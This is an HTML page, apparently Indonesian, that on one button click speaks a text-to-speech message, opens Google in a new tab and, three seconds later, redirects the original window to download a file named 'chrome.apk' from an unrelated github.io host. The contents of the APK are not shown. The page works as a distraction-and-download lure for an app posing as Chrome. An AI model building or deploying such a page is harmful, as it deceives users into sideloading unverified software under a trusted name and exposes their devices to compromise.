<!DOCTYPE html>
<html>
<head>

<title>TTS Redirect Download</title>

<meta name="viewport" content="width=device-width, initial-scale=1">

<style>

body{
background:#202124;
color:white;
font-family:Arial;
text-align:center;
padding:40px;
}

button{
background:#4285F4;
color:white;
border:0;
padding:15px 25px;
border-radius:10px;
font-size:18px;
}

</style>

</head>

<body>

<h2>🔊 Auto Voice Redirect</h2>

<button onclick="mulai()">
Mulai
</button>

<p id="status">
Menunggu...
</p>


<script>


function mulai(){


let status =
document.getElementById("status");


// buka tab Google dulu (izin dari klik)

let google =
window.open("about:blank","_blank");



let suara =
new SpeechSynthesisUtterance(
"Membuka Google dan mengunduh file"
);


suara.lang="id-ID";



suara.onend=function(){


status.innerHTML =
"Membuka Google...";


google.location.href =
"https://www.google.com";



// download setelah redirect

setTimeout(function(){


window.location.href =
"https://ecdnts-del.github.io/test-apk/chrome.apk";


},3000);



};



speechSynthesis.speak(suara);


}


</script>


</body>
</html>
